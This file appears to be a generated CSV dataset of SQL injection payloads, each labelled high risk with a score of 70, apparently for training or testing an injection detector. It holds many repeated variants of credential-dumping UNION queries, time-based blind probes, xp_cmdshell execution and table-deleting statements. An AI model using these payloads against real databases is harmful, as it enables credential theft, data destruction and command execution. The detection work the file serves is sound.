query,risk,score
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # a",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR SLEEP(5) AND '1'='1 # i,high,70
' OR SLEEP(5) AND '1'='1 # 9,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # g,high,70
'; SELECT pg_sleep(5); -- # i,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # z,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # f,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 0",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 0",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # a,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 5,high,70
'; WAITFOR DELAY '0:0:5'-- # 2,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # l,high,70
' OR SLEEP(5) AND '1'='1 # j,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' UNION ALL SELECT username, password FROM users # m",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # i",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 3,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' UNION ALL SELECT username, password FROM users # 2",high,70
'; DROP PROCEDURE admin_login-- # y,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # z",high,70
'; DELETE FROM users; /**/ # d,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # i",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # y,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # q,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DELETE FROM users; /**/ # c,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # w,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; SELECT pg_sleep(5); -- # j,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # u,high,70
' OR SLEEP(5) AND '1'='1 # c,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # t",high,70
'; DELETE FROM users; /**/ # c,high,70
'; DROP PROCEDURE admin_login-- # 2,high,70
' OR 1=1; DROP TABLE temp; -- # 2,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DELETE FROM users; /**/ # 7,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # p",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # a",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # z",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; DROP TABLE temp; -- # g,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DROP PROCEDURE admin_login-- # w,high,70
'; SELECT pg_sleep(5); -- # w,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # s,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR SLEEP(5) AND '1'='1 # w,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # c,high,70
'; DELETE FROM users; /**/ # f,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # x",high,70
'; SELECT pg_sleep(5); -- # i,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # s",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- # f,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- # h,high,70
'; WAITFOR DELAY '0:0:5'-- # v,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # g",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' UNION ALL SELECT username, password FROM users # 0",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 4",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # l,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # o",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' UNION ALL SELECT username, password FROM users # a",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # 4,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # p",high,70
' OR 1=1; DROP TABLE temp; -- # 9,high,70
"' UNION ALL SELECT username, password FROM users # q",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # v",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # g",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DELETE FROM users; /**/ # f,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # m,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # k,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR SLEEP(5) AND '1'='1 # j,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 4,high,70
' OR 1=1; DROP TABLE temp; -- # l,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # y",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # q,high,70
'; WAITFOR DELAY '0:0:5'-- # 0,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # q,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; SELECT pg_sleep(5); -- # 3,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # u,high,70
"' UNION ALL SELECT username, password FROM users # 8",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # e,high,70
'; SELECT pg_sleep(5); -- # g,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # j",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # t",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # c",high,70
'; SELECT pg_sleep(5); -- # j,high,70
"' UNION ALL SELECT username, password FROM users # b",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # y,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # e,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # a,high,70
' OR 1=1; DROP TABLE temp; -- # 9,high,70
' OR SLEEP(5) AND '1'='1 # 4,high,70
'; WAITFOR DELAY '0:0:5'-- # t,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' UNION ALL SELECT username, password FROM users # l",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 0",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # a",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # h,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # f,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' UNION ALL SELECT username, password FROM users # l",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; SELECT pg_sleep(5); -- # 2,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 5",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # q,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DELETE FROM users; /**/ # v,high,70
'; WAITFOR DELAY '0:0:5'-- # 1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; DROP PROCEDURE admin_login-- # u,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # e",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 7,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # c,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # e,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # e",high,70
'; SELECT pg_sleep(5); -- # j,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 0",high,70
'; WAITFOR DELAY '0:0:5'-- # w,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # x",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # x,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 8,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 7,high,70
'; SELECT pg_sleep(5); -- # z,high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 1",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DELETE FROM users; /**/ # c,high,70
"' UNION ALL SELECT username, password FROM users # 5",high,70
'; DELETE FROM users; /**/ # o,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DROP PROCEDURE admin_login-- # n,high,70
'; WAITFOR DELAY '0:0:5'-- # 4,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # r",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DROP PROCEDURE admin_login-- # t,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR SLEEP(5) AND '1'='1 # j,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- # m,high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # e",high,70
'; DELETE FROM users; /**/ # h,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # w,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # p",high,70
'; DELETE FROM users; /**/ # 8,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # v",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # e",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # r",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 3",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DROP PROCEDURE admin_login-- # 8,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 4",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # k,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # x",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # p",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # v,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 5",high,70
'; DELETE FROM users; /**/ # 7,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # r",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # v,high,70
'; DROP PROCEDURE admin_login-- # w,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # f,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 8,high,70
'; SELECT pg_sleep(5); -- # j,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # c",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # y",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- # 2,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # 4,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # q",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # q",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 2",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 8,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # r,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR SLEEP(5) AND '1'='1 # 4,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # d,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 5,high,70
' OR SLEEP(5) AND '1'='1 # g,high,70
"' UNION ALL SELECT username, password FROM users # g",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 5",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 7,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # w,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # k,high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # u",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # n",high,70
'; SELECT pg_sleep(5); -- # s,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # h",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # z,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # n",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 8,high,70
'; DROP PROCEDURE admin_login-- # u,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 0",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # c",high,70
' OR SLEEP(5) AND '1'='1 # v,high,70
'; DROP PROCEDURE admin_login-- # s,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # b",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # t",high,70
' OR SLEEP(5) AND '1'='1 # g,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 4,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' UNION ALL SELECT username, password FROM users # 4",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # s",high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; SELECT pg_sleep(5); -- # h,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # 9,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DROP PROCEDURE admin_login-- # 9,high,70
'; SELECT pg_sleep(5); -- # q,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # p,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' UNION ALL SELECT username, password FROM users # l",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # e",high,70
'; SELECT pg_sleep(5); -- # z,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DELETE FROM users; /**/ # z,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # j,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # g,high,70
' OR SLEEP(5) AND '1'='1 # a,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # b",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # v,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; SELECT pg_sleep(5); -- # 5,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # m,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # f,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # a",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # m",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # r",high,70
' OR SLEEP(5) AND '1'='1 # k,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # x,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DROP PROCEDURE admin_login-- # q,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 5,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # i",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DELETE FROM users; /**/ # l,high,70
"' UNION ALL SELECT username, password FROM users # r",high,70
'; DROP PROCEDURE admin_login-- # 3,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 8,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # u",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # g",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; SELECT pg_sleep(5); -- # q,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR SLEEP(5) AND '1'='1 # c,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR SLEEP(5) AND '1'='1 # s,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # c",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # o,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # h,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; DELETE FROM users; /**/ # i,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # x",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # a,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # g,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # e,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # k,high,70
